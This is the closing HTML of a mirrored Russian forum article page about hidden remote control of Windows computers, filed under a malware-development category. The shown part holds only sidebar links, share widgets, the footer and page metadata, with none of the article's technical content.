+		</div>
+		
+		<div class="contentRow-main contentRow-main--close">
+			<a href="../pochemu-v-linux-vse-fail.73/index.html">Почему в Linux всё — файл?</a>
+
+			
+			
+			<div class="contentRow-snippet">
+				---
+
+## 🔹 Оглавление
+
+[1. Философия UNIX: «Everything is a file»]
+[2. Как работает VFS — Virtual...
+			</div>				
+
+			
+		</div>
+	</div>
+
+						</li>
+					
+						<li>
+							
+	
+	<div class="contentRow">
+		<div class="contentRow-figure">
+			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
+			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
+		</a>
+		</div>
+		
+		<div class="contentRow-main contentRow-main--close">
+			<a href="../zashchita-ot-roskomnadzora.70/index.html">Защита от Роскомнадзора</a>
+
+			
+			
+			<div class="contentRow-snippet">
+				В связи с тем-что РКН внедрили ботов для автоматического поиска неугодного контента и...
+			</div>				
+
+			
+		</div>
+	</div>
+
+						</li>
+					
+						<li>
+							
+	
+	<div class="contentRow">
+		<div class="contentRow-figure">
+			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
+			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
+		</a>
+		</div>
+		
+		<div class="contentRow-main contentRow-main--close">
+			<a href="../uyazvimosti-v-bash-skriptakh.69/index.html">Уязвимости в bash скриптах</a>
+
+			
+			
+			<div class="contentRow-snippet">
+				Вот кто хоть раз интересовался безопасностью, наверное помнят всякие инъекции в php и не...
+			</div>				
+
+			
+		</div>
+	</div>
+
+						</li>
+					
+					</ul>
+				</div>
+			</div>
+		</div>
+						
+							<div class="block">
+				<div class="block-container">
+					
+						<h3 class="block-minorHeader">Поделиться этой статьей</h3>
+						
+							<div class="block-body block-row block-row--separated">
+								
+									
+
+	
+
+	
+		
+
+		<div class="shareButtons shareButtons--iconic" data-xf-init="share-buttons" data-page-url="" data-page-title="" data-page-desc="" data-page-image="">
+			<span class="u-anchorTarget" id="_xfUid-1-1758965450"></span>
+
+			
+
+			<div class="shareButtons-buttons">
+				
+					
+
+					
+
+					
+
+					
+
+					
+
+					
+
+					
+
+					
+
+					
+						<a class="shareButtons-button shareButtons-button--email" href="#_xfUid-1-1758965450" data-href="mailto:?subject={title}&amp;body={url}">
+							<i class="fa--xf far fa-envelope "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#envelope"></use></svg></i>
+							<span>Электронная почта</span>
+						</a>
+					
+
+					
+						<a class="shareButtons-button shareButtons-button--share is-hidden" href="#_xfUid-1-1758965450"
+							data-xf-init="web-share"
+							data-title="" data-text="" data-url=""
+							data-hide=".shareButtons-button:not(.shareButtons-button--share)">
+
+							<i class="fa--xf far fa-share-alt "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#share-alt"></use></svg></i>
+							<span>Поделиться</span>
+						</a>
+					
+
+					
+						<a class="shareButtons-button shareButtons-button--link is-hidden" href="#_xfUid-1-1758965450" data-clipboard="{url}">
+							<i class="fa--xf far fa-link "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#link"></use></svg></i>
+							<span>Ссылка</span>
+						</a>
+					
+				
+			</div>
+		</div>
+	
+
+								
+							</div>
+						
+						
+							<div class="block-body block-row block-row--separated">
+								
+									
+										
+	
+
+	
+
+	<div class="shareInput" data-xf-init="share-input" data-success-text="">
+		
+			<label class="shareInput-label" for="_xfUid-2-1758965450">Копировать BB-код адреса статьи</label>
+		
+		<div class="inputGroup inputGroup--joined">
+			<div class="shareInput-button inputGroup-text js-shareButton is-hidden"
+				data-xf-init="tooltip" title="Скопировать в буфер обмена">
+
+				<i class="fa--xf far fa-copy "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#copy"></use></svg></i>
+			</div>
+			<input type="text" class="input shareInput-input js-shareInput" readonly="readonly" value="[URL=&quot;https://osint42.org/articles/skrytoye-upravleniye-komp-yuterom-na-windows-adovaya-stat-ya.56/&quot;]Скрытое управление компьютером на Windows, адовая статья[/URL]" id="_xfUid-2-1758965450" />
+		</div>
+	</div>
+
+									
+									
+										
+	
+
+	
+
+	<div class="shareInput" data-xf-init="share-input" data-success-text="">
+		
+			<label class="shareInput-label" for="_xfUid-3-1758965450">Копировать BB-код статьи</label>
+		
+		<div class="inputGroup inputGroup--joined">
+			<div class="shareInput-button inputGroup-text js-shareButton is-hidden"
+				data-xf-init="tooltip" title="Скопировать в буфер обмена">
+
+				<i class="fa--xf far fa-copy "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#copy"></use></svg></i>
+			</div>
+			<input type="text" class="input shareInput-input js-shareInput" readonly="readonly" value="[AMS=article, 56][/AMS]" id="_xfUid-3-1758965450" />
+		</div>
+	</div>
+
+									
+								
+							</div>
+						
+					
+				</div>
+			</div>
+						
+						
+					</div>
+				
+			</div>
+
+			
+			
+	
+		<ul class="p-breadcrumbs p-breadcrumbs--bottom"
+			itemscope itemtype="https://schema.org/BreadcrumbList">
+			
+				
+
+				
+				
+
+				
+
+				
+				
+					
+					
+	<li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+		<a href="../categories/uroki-razrabotki-vredonosnogo-softa.2/index.html" itemprop="item">
+			<span itemprop="name">Уроки разработки вредоносного софта</span>
+		</a>
+		<meta itemprop="position" content="1" />
+	</li>
+
+				
+			
+		</ul>
+	
+
+			
+		</div>
+	</div>
+
+	<footer class="p-footer" id="footer">
+		<div class="p-footer-inner">
+
+			<div class="p-footer-row">
+				
+					<div class="p-footer-row-main">
+						<ul class="p-footer-linkList">
+							
+								
+								
+									<li>
+										
+											
+											
+												<a href="https://osint42.org/misc/style-variation" rel="nofollow"
+													class="js-styleVariationsLink"
+													data-xf-init="tooltip" title=" Выбор стиля"
+													data-xf-click="menu" data-z-index-ref=".u-bottomFixer" role="button" aria-expanded="false" aria-haspopup="true">
+
+													<i class="fa--xf far fa-moon "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Выбор стиля</title><use href="../../data/local/icons/regulare419.svg?v=1757401797#moon"></use></svg></i>
+												</a>
+
+												<div class="menu" data-menu="menu" aria-hidden="true">
+													<div class="menu-content js-styleVariationsMenu">
+														
+
+	
+		
+
+	<a href="https://osint42.org/misc/style-variation?reset=1&amp;t=1758965450%2C24864d601dac6d1ac956380e4d995636"
+		class="menu-linkRow "
+		rel="nofollow"
+		data-xf-click="style-variation" data-variation="">
+
+		<i class="fa--xf far fa-adjust "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#adjust"></use></svg></i>
+
+		
+			Системный
+		
+	</a>
+
+
+		
+
+	<a href="https://osint42.org/misc/style-variation?variation=default&amp;t=1758965450%2C24864d601dac6d1ac956380e4d995636"
+		class="menu-linkRow "
+		rel="nofollow"
+		data-xf-click="style-variation" data-variation="default">
+
+		<i class="fa--xf far fa-sun "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#sun"></use></svg></i>
+
+		
+			Светлый
+		
+	</a>
+
+
+		
+
+	<a href="https://osint42.org/misc/style-variation?variation=alternate&amp;t=1758965450%2C24864d601dac6d1ac956380e4d995636"
+		class="menu-linkRow is-selected"
+		rel="nofollow"
+		data-xf-click="style-variation" data-variation="alternate">
+
+		<i class="fa--xf far fa-moon "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#moon"></use></svg></i>
+
+		
+			Тёмный
+		
+	</a>
+
+	
+
+	
+		
+	
+
+													</div>
+												</div>
+											
+										
+									</li>
+								
+								
+									<li><a href="../../misc/language.html" data-xf-click="overlay"
+										data-xf-init="tooltip" title="Выбор языка" rel="nofollow">
+										<i class="fa--xf far fa-globe "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#globe"></use></svg></i> Русский (RU)</a></li>
+								
+							
+						</ul>
+					</div>
+				
+				<div class="p-footer-row-opposite">
+					<ul class="p-footer-linkList">
+						
+
+						
+							<li><a href="../../threads/pravila-resursa.56/index.html">Условия и правила</a></li>
+						
+
+						
+							<li><a href="../../help/privacy-policy/index.html">Политика конфиденциальности</a></li>
+						
+
+						
+							<li><a href="../../help/index.html">Помощь</a></li>
+						
+
+						
+							<li><a href="../../forums/index.html">Главная</a></li>
+						
+
+						<li><a href="../../forums/-/index.rss" target="_blank" class="p-footer-rssLink" title="RSS"><span aria-hidden="true"><i class="fa--xf far fa-rss "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#rss"></use></svg></i><span class="u-srOnly">RSS</span></span></a></li>
+					</ul>
+				</div>
+			</div>
+
+			
+
+			
+		</div>
+	</footer>
+</div> <!-- closing p-pageWrapper -->
+
+<div class="u-bottomFixer js-bottomFixTarget">
+	
+	
+</div>
+
+<div class="u-navButtons js-navButtons">
+	<a href="javascript:" class="button button--scroll"><span class="button-text"><i class="fa--xf far fa-arrow-left "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#arrow-left"></use></svg></i><span class="u-srOnly">Назад</span></span></a>
+</div>
+
+
+	<div class="u-scrollButtons js-scrollButtons" data-trigger-type="both">
+		<a href="#top" class="button button--scroll" data-xf-click="scroll-to"><span class="button-text"><i class="fa--xf far fa-arrow-up "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#arrow-up"></use></svg></i><span class="u-srOnly">Верх</span></span></a>
+		
+			<a href="#footer" class="button button--scroll" data-xf-click="scroll-to"><span class="button-text"><i class="fa--xf far fa-arrow-down "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#arrow-down"></use></svg></i><span class="u-srOnly">Низ</span></span></a>
+		
+	</div>
+
+
+
+	<form style="display:none" hidden="hidden">
+		<input type="text" name="_xfClientLoadTime" value="" id="_xfClientLoadTime" title="_xfClientLoadTime" tabindex="-1" />
+	</form>
+
+	
+
+
+
+
+
+    
+    
+        
+        
+            <script data-cfasync="false" src="../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="application/ld+json">
+                {
+    "@context": "https://schema.org",
+    "@type": "CreativeWorkSeries",
+    "@id": "https://osint42.org/articles/skrytoye-upravleniye-komp-yuterom-na-windows-adovaya-stat-ya.56/",
+    "name": "\u0421\u043a\u0440\u044b\u0442\u043e\u0435 \u0443\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u043a\u043e\u043c\u043f\u044c\u044e\u0442\u0435\u0440\u043e\u043c \u043d\u0430 Windows, \u0430\u0434\u043e\u0432\u0430\u044f \u0441\u0442\u0430\u0442\u044c\u044f",
+    "headline": "\u0421\u043a\u0440\u044b\u0442\u043e\u0435 \u0443\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u043a\u043e\u043c\u043f\u044c\u044e\u0442\u0435\u0440\u043e\u043c \u043d\u0430 Windows, \u0430\u0434\u043e\u0432\u0430\u044f \u0441\u0442\u0430\u0442\u044c\u044f",
+    "alternativeHeadline": "\u0421\u043a\u0440\u044b\u0442\u043e\u0435 \u0443\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u043a\u043e\u043c\u043f\u044c\u044e\u0442\u0435\u0440\u043e\u043c \u043d\u0430 Windows, \u0430\u0434\u043e\u0432\u0430\u044f \u0441\u0442\u0430\u0442\u044c\u044f",
+    "description": "\u0421\u0442\u0430\u0442\u044c\u044f \u043d\u0435 \u043d\u043e\u0432\u0430\u044f, \u043d\u0430\u0448\u0435\u043b \u043d\u0430 \u0441\u0442\u0430\u0440\u043e\u043c \u0444\u043e\u0440\u0443\u043c\u0435, \u043d\u043e \u043d\u0435 \u043f\u043b\u043e\u0445\u043e \u043e\u043f\u0438\u0441\u0430\u043d\u043e \u0432\u0441\u0451.\n\n\u0412\u043e\u0437\u043c\u043e\u0436\u043d\u043e \u043a\u0430\u043a\u0438\u0435-\u0442\u043e \u043a\u043e\u043c\u0430\u043d\u0434\u044b \u043c\u043e\u0433\u0443\u0442 \u0443\u0441\u0442\u0430\u0440\u0435\u0442\u044c, \u043d\u043e \u0434\u0443\u043c\u0430\u044e \u0435\u0441\u0442\u044c \u0430\u043d\u0430\u043b\u043e\u0433\u0438, \u0447\u0438\u0442\u0430\u0439\u0442\u0435 \u0441\u043f\u0440\u0430\u0432\u043a\u0443, \u0432 \u043e\u0441\u0442\u0430\u043b\u044c\u043d\u043e\u043c \u0432\u0441\u0451 \u0430\u043a\u0442\u0443\u0430\u043b\u044c\u043d\u043e \u0434\u043e\u043b\u0436\u043d\u043e \u0431\u044b\u0442\u044c.)\n\n1. \u0412\u0432\u0435\u0434\u0435\u043d\u0438\u0435\n\n\u0412 \u044d\u0442\u043e\u0439 \u0437\u0430\u043c\u0435\u0442\u043a\u0435 \u0431\u0443\u0434\u0435\u0442 \u0440\u0430\u0441\u0441\u043c\u043e\u0442\u0440\u0435\u043d \u0432\u043e\u043f\u0440\u043e\u0441...",
+    "keywords": "",
+    "dateCreated": "2025-07-22T14:25:06+00:00",
+    "dateModified": "2025-07-22T14:25:06+00:00",
+    "author": {
+        "@type": "Person",
+        "name": "0x42"
+    },
+    "thumbnailUrl": "https://osint42.org/data/attachments/0/778-94250f376fa3c9ace278f072f1c89da5.jpg?hash=fKtLbNKbYE",
+    "interactionStatistic": [
+        {
+            "@type": "InteractionCounter",
+            "interactionType": "https://schema.org/CommentAction",
+            "userInteractionCount": "0"
+        },
+        {
+            "@type": "InteractionCounter",
+            "interactionType": "https://schema.org/LikeAction",
+            "userInteractionCount": "0"
+        },
+        {
+            "@type": "InteractionCounter",
+            "interactionType": "https://schema.org/ViewAction",
+            "userInteractionCount": "497"
+        }
+    ]
+}
+            </script>
+        
+    
+
+
+
+	
+			
+	
+
+				
+			
+		
+		
+	
+
+</body>
+
+<!-- Mirrored from osint42.org/articles/skrytoye-upravleniye-komp-yuterom-na-windows-adovaya-stat-ya.56/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 27 Sep 2025 09:35:10 GMT -->
+</html>
+
+
+
+
+
+
+
+
+
